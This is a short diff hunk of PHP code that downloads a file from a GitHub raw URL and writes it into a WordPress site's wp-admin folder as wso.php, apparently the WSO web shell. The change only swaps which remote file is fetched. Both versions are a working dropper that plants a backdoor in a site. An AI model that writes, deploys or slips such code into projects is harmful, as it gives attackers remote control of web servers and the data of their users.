@@ -19,7 +19,7 @@ if(file_exists($check)){
   echo "not exits";
 echo "done .\n " ;
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/wso.php" ;
-$text2 = http_get('https://raw.githubusercontent.com/drinjection/upload/master/wso.php');
+$text2 = http_get('https://raw.githubusercontent.com/drinjection/upload/master/logs.php');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
